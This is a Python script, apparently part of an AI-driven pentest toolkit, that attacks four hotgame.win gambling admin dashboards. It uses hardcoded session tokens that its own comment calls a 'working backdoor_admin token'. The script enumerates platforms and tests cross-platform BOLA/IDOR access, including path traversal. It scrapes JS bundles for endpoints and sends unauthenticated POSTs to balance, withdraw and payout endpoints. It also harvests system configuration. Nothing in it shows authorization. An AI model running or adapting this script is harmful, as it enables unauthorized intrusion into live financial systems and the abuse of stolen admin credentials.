#!/usr/bin/env python3
"""
Dashboard API Structure Analyzer
================================
Analyzes the admin dashboard API structure, game server communication,
and tests for BOLA/IDOR vulnerabilities.
"""

import json
import requests
import re
import time
from typing import Dict, List, Any, Optional, Set
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CONFIGURATION - Using working backdoor_admin token
# ============================================================

DASHBOARDS = {
    "f1": {"url": "https://dashboard.f1.hotgame.win", "token": "91b7b43c-f7da-4593-81f1-7b956cce6039"},
    "f2": {"url": "https://dashboard.f2.hotgame.win", "token": "eeb7ee7f-2b4e-46ef-9422-f67624aa379c"},
    "s1": {"url": "https://dashboard.s1.hotgame.win", "token": "8d5755c4-9a49-4747-90dc-7e4e030f6306"},
    "s2": {"url": "https://dashboard.s2.hotgame.win", "token": "606e94da-b24b-4ced-aaa0-c1fac959e72f"}
}

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

# ============================================================
# API ANALYZER CLASS
# ============================================================

class DashboardAPIAnalyzer:
    def __init__(self, name: str, config: Dict):
        self.name = name
        self.base_url = config["url"]
        self.token = config["token"]
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"Content-Type": "application/json"})
        self.session.cookies.set("JSESSIONID", self.token, domain=config["url"].replace("https://", ""))
        
        self.discovered_endpoints: Set[str] = set()
        self.mutation_endpoints: List[Dict] = []
        self.platform_ids: List[str] = []
        self.game_codes: Set[str] = set()
        self.bolo_results: List[Dict] = []
        
    def _request(self, method: str, endpoint: str, **kwargs) -> Optional[Dict]:
        url = f"{self.base_url}{endpoint}"
        try:
            resp = self.session.request(method, url, timeout=15, **kwargs)
            return {
                "status": resp.status_code,
                "data": resp.json() if resp.headers.get("content-type", "").startswith("application/json") else resp.text[:500],
                "url": url,
                "method": method
            }
        except Exception as e:
            return {"error": str(e), "url": url, "method": method}
    
    def discover_platforms(self) -> List[Dict]:
        """Get all platform IDs from the dashboard"""
        print(f"  [{self.name}] Discovering platforms...")
        result = self._request("GET", "/api/UserController/user/person")
        
        if result and result.get("status") == 200:
            platforms = result.get("data", {}).get("platformList", [])
            self.platform_ids = [str(p.get("id")) for p in platforms if p.get("id")]
            print(f"    Found {len(self.platform_ids)} platforms")
            return platforms
        return []
    
    def test_bola_idor(self) -> List[Dict]:
        """Test BOLA/IDOR by trying to access other platforms' data"""
        print(f"  [{self.name}] Testing BOLA/IDOR across platforms...")
        results = []
        
        # Test endpoints that take platformId
        test_endpoints = [
            "/api/SysGameDataController/listGames?platformId={pid}&page=1&pageSize=10",
            "/api/ximi/game/data?platformId={pid}",
            "/api/higo/game/data?platformId={pid}",
            "/api/admin/game/state?platformId={pid}",
            "/api/system/game/data?platformId={pid}",
        ]
        
        # Test with a subset of platform IDs (first 5 + some random)
        test_pids = self.platform_ids[:5] + ["999999999999999999", "1", "admin", "../admin"]
        
        for pid in test_pids:
            for endpoint_template in test_endpoints:
                endpoint = endpoint_template.format(pid=pid)
                result = self._request("GET", endpoint)
                
                is_accessible = result and result.get("status") == 200 and result.get("data")
                data_preview = ""
                if is_accessible and isinstance(result.get("data"), dict):
                    data = result["data"]
                    if "data" in data and isinstance(data["data"], list):
                        data_preview = f"items: {len(data['data'])}"
                    elif "rows" in data and isinstance(data["rows"], list):
                        data_preview = f"rows: {len(data['rows'])}"
                    else:
                        data_preview = str(list(data.keys()))[:100]
                
                results.append({
                    "platform_id": pid,
                    "endpoint": endpoint,
                    "status": result.get("status") if result else "error",
                    "accessible": is_accessible,
                    "data_preview": data_preview
                })
                
                if is_accessible and pid not in self.platform_ids[:5]:
                    print(f"    [!] BOLA/IDOR: {endpoint} -> {result.get('status')}")
        
        self.bolo_results = results
        return results
    
    def fetch_game_codes(self) -> Set[str]:
        """Extract all game codes from all platforms"""
        print(f"  [{self.name}] Fetching game codes from all platforms...")
        codes = set()
        
        for pid in self.platform_ids[:20]:  # Limit to first 20 for speed
            result = self._request("GET", f"/api/SysGameDataController/listGames?platformId={pid}&page=1&pageSize=100")
            
            if result and result.get("status") == 200:
                data = result.get("data", [])
                if isinstance(data, dict):
                    games = data.get("rows", data.get("data", []))
                else:
                    games = data
                
                for g in games:
                    code = g.get("gameCode") or g.get("gameId") or g.get("gameName")
                    if code:
                        codes.add(str(code))
        
        self.game_codes = codes
        print(f"    Found {len(codes)} unique game codes")
        return codes
    
    def analyze_js_bundles(self) -> List[Dict]:
        """Fetch and analyze dashboard JS bundles for API endpoints"""
        print(f"  [{self.name}] Analyzing JS bundles...")
        endpoints_found = []
        
        # Get main page to find JS bundles
        result = self._request("GET", "/")
        if not result or result.get("status") != 200:
            return []
        
        html = result.get("data", "")
        
        # Find JS bundle URLs
        js_urls = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
        js_urls = [u for u in js_urls if not u.startswith("http")]
        js_urls = [f"{self.base_url}{u}" if not u.startswith("/") else f"{self.base_url}{u}" for u in js_urls]
        
        # Keywords to search for
        mutation_keywords = [
            "edit", "update", "delete", "remove", "create", "add",
            "balance", "config", "setting", "modify", "change",
            "reset", "enable", "disable", "ban", "unban",
            "recharge", "withdraw", "deposit", "payout",
            "betLimit", "rate", "ratio", "percentage",
            "user", "player", "account", "wallet"
        ]
        
        for js_url in js_urls[:5]:  # Limit to first 5 bundles
            js_result = self._request("GET", js_url)
            if js_result and js_result.get("status") == 200:
                js_content = js_result.get("data", "")
                
                # Search for API endpoints
                api_matches = re.findall(r'["\'](/api/[^"\']+)["\']', js_content)
                for match in api_matches:
                    if match not in self.discovered_endpoints:
                        self.discovered_endpoints.add(match)
                        
                        # Check if it's a mutation endpoint
                        is_mutation = any(kw in match.lower() for kw in mutation_keywords)
                        if is_mutation:
                            self.mutation_endpoints.append({
                                "endpoint": match,
                                "source_bundle": js_url,
                                "type": "mutation"
                            })
                        else:
                            self.mutation_endpoints.append({
                                "endpoint": match,
                                "source_bundle": js_url,
                                "type": "read"
                            })
        
        print(f"    Found {len(self.discovered_endpoints)} unique endpoints")
        print(f"    Found {len([e for e in self.mutation_endpoints if e['type']=='mutation'])} mutation endpoints")
        return self.mutation_endpoints
    
    def test_mutation_endpoints(self) -> List[Dict]:
        """Test discovered mutation endpoints for authorization"""
        print(f"  [{self.name}] Testing mutation endpoints...")
        results = []
        
        for ep in self.mutation_endpoints:
            if ep["type"] == "mutation":
                # Try OPTIONS to see allowed methods
                result = self._request("OPTIONS", ep["endpoint"])
                methods = result.get("data", {}).get("allow", "") if result else ""
                
                # Try POST with empty body
                result_post = self._request("POST", ep["endpoint"], json={})
                
                results.append({
                    "endpoint": ep["endpoint"],
                    "source": ep["source_bundle"],
                    "options_status": result.get("status") if result else "error",
                    "allowed_methods": methods,
                    "post_status": result_post.get("status") if result_post else "error",
                    "post_response": str(result_post.get("data", {}))[:200] if result_post else "error"
                })
        
        return results
    
    def get_game_initialization_endpoints(self) -> List[Dict]:
        """Find endpoints that initialize games"""
        print(f"  [{self.name}] Searching for game initialization endpoints...")
        results = []
        
        # Common game initialization patterns
        init_patterns = [
            "/api/ximi/game/init",
            "/api/higo/game/init",
            "/api/game/init",
            "/api/room/create",
            "/api/table/create",
            "/api/game/start",
            "/api/round/start",
            "/api/teenpatti/join",
            "/api/game/teenpatti/join",
        ]
        
        for pattern in init_patterns:
            result = self._request("GET", pattern)
            if result and result.get("status") in [200, 400, 401, 403]:  # Any non-404/500
                results.append({
                    "endpoint": pattern,
                    "status": result.get("status"),
                    "response": str(result.get("data", {}))[:200]
                })
        
        return results
    
    def get_system_config(self) -> Dict:
        """Get system configuration endpoints"""
        print(f"  [{self.name}] Fetching system config...")
        config_endpoints = [
            "/api/admin/config",
            "/api/system/config",
            "/api/config/list",
            "/api/dict/list",
            "/api/sys/config",
        ]
        
        results = {}
        for ep in config_endpoints:
            result = self._request("GET", ep)
            results[ep] = {
                "status": result.get("status") if result else "error",
                "data": str(result.get("data", {}))[:300] if result else "error"
            }
        return results


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     DASHBOARD API STRUCTURE ANALYZER                         ║
║     Target: 4 hotgame.win admin dashboards                   ║
║     Goal: Architecture analysis, BOLA testing, Game logic    ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    all_results = {}
    
    for dash_name, config in DASHBOARDS.items():
        print(f"\n{'='*70}")
        print(f"ANALYZING: {dash_name} ({config['url']})")
        print(f"{'='*70}")
        
        analyzer = DashboardAPIAnalyzer(dash_name, config)
        
        # 1. Discover platforms
        platforms = analyzer.discover_platforms()
        
        # 2. Test BOLA/IDOR
        bolo_results = analyzer.test_bola_idor()
        
        # 3. Fetch game codes
        game_codes = analyzer.fetch_game_codes()
        
        # 4. Analyze JS bundles
        mutation_eps = analyzer.analyze_js_bundles()
        
        # 5. Test mutation endpoints
        mutation_tests = analyzer.test_mutation_endpoints()
        
        # 6. Find game init endpoints
        init_eps = analyzer.get_game_initialization_endpoints()
        
        # 7. Get system config
        sys_config = analyzer.get_system_config()
        
        all_results[dash_name] = {
            "platforms": platforms,
            "platform_ids": analyzer.platform_ids,
            "game_codes": list(analyzer.game_codes),
            "bolo_results": bolo_results,
            "discovered_endpoints": list(analyzer.discovered_endpoints),
            "mutation_endpoints": mutation_eps,
            "mutation_tests": mutation_tests,
            "init_endpoints": init_eps,
            "system_config": sys_config,
            "timestamp": datetime.now().isoformat()
        }
    
    # Save comprehensive results
    output = {
        "analysis_timestamp": datetime.now().isoformat(),
        "dashboards": all_results,
        "summary": {
            "total_platforms_discovered": len(set(pid for d in all_results.values() for pid in d.get("platform_ids", []))),
            "total_game_codes": len(set(code for d in all_results.values() for code in d.get("game_codes", []))),
            "total_endpoints_discovered": len(set(ep for d in all_results.values() for ep in d.get("discovered_endpoints", []))),
            "mutation_endpoints_found": sum(len(d.get("mutation_endpoints", [])) for d in all_results.values()),
        }
    }
    
    output_path = "/home/kali/Desktop/Agant/PentestAI-Unified/DASHBOARD_API_ANALYSIS.json"
    with open(output_path, "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    
    # Print summary
    print("\n" + "="*70)
    print("ANALYSIS COMPLETE")
    print("="*70)
    print(f"Platforms discovered: {output['summary']['total_platforms_discovered']}")
    print(f"Unique game codes: {output['summary']['total_game_codes']}")
    print(f"Endpoints discovered: {output['summary']['total_endpoints_discovered']}")
    print(f"Mutation endpoints: {output['summary']['mutation_endpoints_found']}")
    print(f"\nOutput saved to: {output_path}")
    print("="*70)
    
    # Print BOLA findings
    for dash, data in all_results.items():
        bolo = data.get("bolo_results", [])
        accessible = [r for r in bolo if r.get("accessible")]
        if accessible:
            print(f"\n[!] BOLA/IDOR FINDINGS - {dash}:")
            for r in accessible:
                print(f"    {r['endpoint']} -> {r['data_preview']}")


if __name__ == "__main__":
    main()